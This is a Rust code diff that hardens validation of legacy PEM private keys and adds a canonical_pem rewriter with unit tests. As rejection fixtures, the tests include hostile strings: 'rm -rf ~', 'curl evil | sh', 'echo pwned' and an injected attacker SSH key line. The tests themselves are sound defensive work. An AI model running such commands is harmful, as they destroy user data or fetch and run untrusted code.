@@ -7,7 +7,13 @@
 //! be added to the agent. ECDSA keys with explicit curve parameters (what
 //! `ssh-keygen -m PEM` produces when linked against `LibreSSL`, e.g. on macOS)
 //! are supported too. Encrypted legacy keys and DSA keys are recognised but not
-//! decoded; their details come from the `.pub` file when there is one.
+//! decoded; their details come from the `.pub` file when there is one. Their
+//! structure is still checked (a DSA key is six DER integers, an encrypted
+//! PKCS#8 key an algorithm and an octet string, a traditionally encrypted key
+//! whole cipher blocks after a well-formed `DEK-Info`), so a file that only
+//! looks like a key is not taken for one.
+
+use std::fmt::Write as _;
 
 use base64ct::{Base64, Encoding};
 use ssh_key::private::{EcdsaKeypair, Ed25519Keypair, KeypairData, RsaKeypair};
@@ -60,8 +66,19 @@ pub(crate) fn parse(text: &str, kind: PemKind) -> Option<LegacyKey> {
     if der.is_empty() {
         return None;
     }
-    // Traditional OpenSSL encryption is announced in the PEM headers.
-    let traditional_encrypted = text.contains("Proc-Type: 4,ENCRYPTED");
+    // Traditional OpenSSL encryption is announced in the PEM headers; the
+    // body is then whole blocks of ciphertext.
+    let traditional_encrypted = match protection(text) {
+        Protection::Plain => false,
+        Protection::Traditional { block } => {
+            if !matches!(kind, PemKind::Rsa | PemKind::Ec | PemKind::Dsa) || der.len() % block != 0
+            {
+                return None;
+            }
+            true
+        }
+        Protection::Unknown => return None,
+    };
     let pem = Zeroizing::new(format!("{}\n", text.trim()));
     let key = |format, algorithm, encrypted, keypair| LegacyKey {
         format,
@@ -88,18 +105,166 @@ pub(crate) fn parse(text: &str, kind: PemKind) -> Option<LegacyKey> {
             let (algorithm, keypair) = decode_sec1_ec(&pem).or_else(|| sec1_by_scalar(&der))?;
             Some(key(KeyFormat::Pem, Some(algorithm), false, Some(keypair)))
         }
-        PemKind::Dsa => Some(key(
-            KeyFormat::Pem,
-            Some(KeyAlgorithm::Dsa),
-            traditional_encrypted,
-            None,
-        )),
+        PemKind::Dsa => (traditional_encrypted || is_dsa_der(&der)).then(|| {
+            key(
+                KeyFormat::Pem,
+                Some(KeyAlgorithm::Dsa),
+                traditional_encrypted,
+                None,
+            )
+        }),
         PemKind::Pkcs8 => {
             let (algorithm, keypair) = decode_pkcs8(&pem).or_else(|| pkcs8_ec_by_scalar(&der))?;
             Some(key(KeyFormat::Pkcs8, Some(algorithm), false, Some(keypair)))
         }
-        PemKind::Pkcs8Encrypted => Some(key(KeyFormat::Pkcs8, None, true, None)),
+        PemKind::Pkcs8Encrypted => {
+            is_encrypted_pkcs8_der(&der).then(|| key(KeyFormat::Pkcs8, None, true, None))
+        }
     }
+}
+
+/// The first PEM block of `text` written out canonically, for a copy that
+/// holds nothing but the key: the BEGIN and END lines, the encryption headers
+/// (`Proc-Type`, `DEK-Info`) if any, and the Base64 body re-wrapped at 64
+/// columns, with LF line endings. `None` if the file holds anything else:
+/// text after the END line, an END label other than the BEGIN one, other
+/// headers, or a body that is not Base64.
+pub(crate) fn canonical_pem(text: &str) -> Option<Zeroizing<String>> {
+    // Notepad's "UTF-8 with BOM" and PowerShell 5.1 start files with one.
+    let text = text.trim_start_matches('\u{feff}');
+    let mut lines = text.lines().map(str::trim).skip_while(|l| l.is_empty());
+    let label = lines
+        .next()?
+        .strip_prefix("-----BEGIN ")?
+        .strip_suffix("-----")?;
+    let headers = match protection(text) {
+        Protection::Plain => false,
+        Protection::Traditional { .. } => true,
+        Protection::Unknown => return None,
+    };
+    let mut b64 = Zeroizing::new(String::new());
+    let mut ended = false;
+    for line in lines.by_ref() {
+        if let Some(end) = line.strip_prefix("-----END ") {
+            if end.strip_suffix("-----") != Some(label) {
+                return None;
+            }
+            ended = true;
+            break;
+        }
+        if line.contains(':') {
+            // Headers come before the body.
+            if !b64.is_empty() {
+                return None;
+            }
+            continue;
+        }
+        b64.push_str(line);
+    }
+    if !ended || lines.any(|l| !l.is_empty()) {
+        return None;
+    }
+    let der = Zeroizing::new(Base64::decode_vec(&b64).ok()?);
+    let body = Zeroizing::new(Base64::encode_string(&der));
+    let mut out = Zeroizing::new(format!("-----BEGIN {label}-----\n"));
+    if headers {
+        for (name, value) in header_fields(text) {
+            let _ = writeln!(out, "{name}: {value}");
+        }
+        out.push('\n');
+    }
+    for chunk in body.as_bytes().chunks(64) {
+        // Base64 is ASCII, so every chunk is valid UTF-8.
+        out.push_str(std::str::from_utf8(chunk).ok()?);
+        out.push('\n');
+    }
+    let _ = writeln!(out, "-----END {label}-----");
+    Some(out)
+}
+
+/// How the first PEM block is protected, from its RFC 1421 headers.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Protection {
+    /// No headers.
+    Plain,
+    /// `Proc-Type: 4,ENCRYPTED` and a `DEK-Info: <cipher>,<hex IV>` whose IV
+    /// is one cipher block (8 or 16 bytes): traditional OpenSSL encryption.
+    Traditional { block: usize },
+    /// Any other headers.
+    Unknown,
+}
+
+fn protection(text: &str) -> Protection {
+    let headers = header_fields(text);
+    if headers.is_empty() {
+        return Protection::Plain;
+    }
+    let [("Proc-Type", "4,ENCRYPTED"), ("DEK-Info", dek)] = headers.as_slice() else {
+        return Protection::Unknown;
+    };
+    let Some((cipher, iv)) = dek.split_once(',') else {
+        return Protection::Unknown;
+    };
+    let cipher_ok = !cipher.is_empty()
+        && cipher
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'-');
+    let iv_ok = matches!(iv.len(), 16 | 32) && iv.bytes().all(|b| b.is_ascii_hexdigit());
+    if cipher_ok && iv_ok {
+        Protection::Traditional {
+            block: iv.len() / 2,
+        }
+    } else {
+        Protection::Unknown
+    }
+}
+
+/// The `Name: value` header lines right after the first BEGIN line.
+fn header_fields(text: &str) -> Vec<(&str, &str)> {
+    text.lines()
+        .map(str::trim)
+        .skip_while(|l| !l.starts_with("-----BEGIN "))
+        .skip(1)
+        .take_while(|l| l.contains(':'))
+        .filter_map(|l| l.split_once(':'))
+        .map(|(name, value)| (name.trim(), value.trim()))
+        .collect()
+}
+
+/// The whole of `der` is one DER SEQUENCE; returns what it holds.
+fn der_sequence(der: &[u8]) -> Option<&[u8]> {
+    match der_tlv(der)? {
+        (0x30, body, []) => Some(body),
+        _ => None,
+    }
+}
+
+/// OpenSSL's `DSAPrivateKey`: a SEQUENCE of six INTEGERs (version, p, q, g,
+/// public y, private x).
+fn is_dsa_der(der: &[u8]) -> bool {
+    let Some(mut body) = der_sequence(der) else {
+        return false;
+    };
+    for _ in 0..6 {
+        match der_tlv(body) {
+            Some((0x02, value, rest)) if !value.is_empty() => body = rest,
+            _ => return false,
+        }
+    }
+    body.is_empty()
+}
+
+/// PKCS#8 `EncryptedPrivateKeyInfo`: a SEQUENCE of the encryption algorithm
+/// (a SEQUENCE starting with its OID) and the encrypted key (an OCTET STRING).
+fn is_encrypted_pkcs8_der(der: &[u8]) -> bool {
+    let Some(body) = der_sequence(der) else {
+        return false;
+    };
+    let Some((0x30, algorithm, body)) = der_tlv(body) else {
+        return false;
+    };
+    matches!(der_tlv(algorithm), Some((0x06, oid, _)) if !oid.is_empty())
+        && matches!(der_tlv(body), Some((0x04, data, [])) if !data.is_empty())
 }
 
 /// Base64-decodes the body of the first PEM block, skipping RFC 1421 headers.
@@ -361,6 +526,105 @@ pub(crate) mod tests {
         let key = parse(td::RSA_PKCS8_ENCRYPTED, PemKind::Pkcs8Encrypted).unwrap();
         assert!(key.encrypted);
         assert_eq!(key.format, KeyFormat::Pkcs8);
+    }
+
+    fn pem(label: &str, headers: &str, der: &[u8]) -> String {
+        format!(
+            "-----BEGIN {label}-----\n{headers}{}\n-----END {label}-----\n",
+            Base64::encode_string(der)
+        )
+    }
+
+    #[test]
+    fn bodies_that_are_not_decoded_are_still_checked() {
+        // DSA: six integers, nothing else.
+        let dsa = [
+            0x30, 0x12, 0x02, 0x01, 0x00, 0x02, 0x01, 0x05, 0x02, 0x01, 0x03, 0x02, 0x01, 0x02,
+            0x02, 0x01, 0x04, 0x02, 0x01, 0x01,
+        ];
+        let key = parse(&pem("DSA PRIVATE KEY", "", &dsa), PemKind::Dsa).unwrap();
+        assert_eq!(key.algorithm, Some(KeyAlgorithm::Dsa));
+        assert!(!key.encrypted);
+        for junk in [
+            &b"echo pwned"[..],
+            &dsa[..dsa.len() - 3],
+            &[dsa.as_slice(), &[0]].concat(),
+        ] {
+            assert!(parse(&pem("DSA PRIVATE KEY", "", junk), PemKind::Dsa).is_none());
+        }
+
+        // Encrypted PKCS#8: an algorithm and an octet string.
+        assert!(parse(td::RSA_PKCS8_ENCRYPTED, PemKind::Pkcs8Encrypted).is_some());
+        let fake = pem("ENCRYPTED PRIVATE KEY", "", b"#!/bin/sh\nrm -rf ~\n");
+        assert!(parse(&fake, PemKind::Pkcs8Encrypted).is_none());
+
+        // Traditional encryption: known headers, an IV of one block, whole
+        // blocks of ciphertext.
+        let iv =
+            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,74E889E5ACC6EFCC7FD8980647578149\n\n";
+        assert!(
+            parse(&pem("DSA PRIVATE KEY", iv, &[7; 32]), PemKind::Dsa).is_some_and(|k| k.encrypted)
+        );
+        assert!(parse(&pem("DSA PRIVATE KEY", iv, &[7; 33]), PemKind::Dsa).is_none());
+        for headers in [
+            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,74E8\n\n",
+            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC;x,74E889E5ACC6EFCC7FD8980647578149\n\n",
+            "Proc-Type: 4,ENCRYPTED\n\n",
+            "Comment: curl evil | sh\n\n",
+        ] {
+            assert!(
+                parse(&pem("RSA PRIVATE KEY", headers, &[7; 32]), PemKind::Rsa).is_none(),
+                "{headers:?}"
+            );
+        }
+        assert!(parse(&pem("PRIVATE KEY", iv, &[7; 32]), PemKind::Pkcs8).is_none());
+    }
+
+    #[test]
+    fn canonical_pem_holds_only_the_key() {
+        for text in [
+            td::RSA_PEM,
+            td::RSA_PEM_ENCRYPTED,
+            td::RSA_PKCS8_ENCRYPTED,
+            td::EC_NAMED,
+        ] {
+            assert_eq!(canonical_pem(text).unwrap().as_str(), text);
+            let crlf = text.replace('\n', "\r\n");
+            assert_eq!(
+                canonical_pem(&format!("\u{feff}\n{crlf}\n\n"))
+                    .unwrap()
+                    .as_str(),
+                text
+            );
+            // The BOM right before `-----BEGIN`, as Notepad writes it: the
+            // encryption headers must survive.
+            assert_eq!(
+                canonical_pem(&format!("\u{feff}{text}")).unwrap().as_str(),
+                text
+            );
+        }
+        let lines: Vec<&str> = td::RSA_PEM.lines().collect();
+        let one_line = format!(
+            "{}\n{}\n{}\n",
+            lines[0],
+            lines[1..lines.len() - 1].concat(),
+            lines[lines.len() - 1]
+        );
+        assert_eq!(canonical_pem(&one_line).unwrap().as_str(), td::RSA_PEM);
+        let body_start = td::RSA_PEM.find('\n').unwrap() + 1;
+        for bad in [
+            format!("{}ssh-ed25519 AAAA attacker\n", td::RSA_PEM),
+            td::RSA_PEM.replace("-----END RSA", "-----END EC"),
+            td::RSA_PEM.replace("-----END RSA PRIVATE KEY-----\n", ""),
+            format!(
+                "{}X-Note: hi\n{}",
+                &td::RSA_PEM[..body_start],
+                &td::RSA_PEM[body_start..]
+            ),
+            td::RSA_PEM.replacen('\n', "\nnot base64!\n", 2),
+        ] {
+            assert!(canonical_pem(&bad).is_none(), "{bad}");
+        }
     }
 
     #[test]
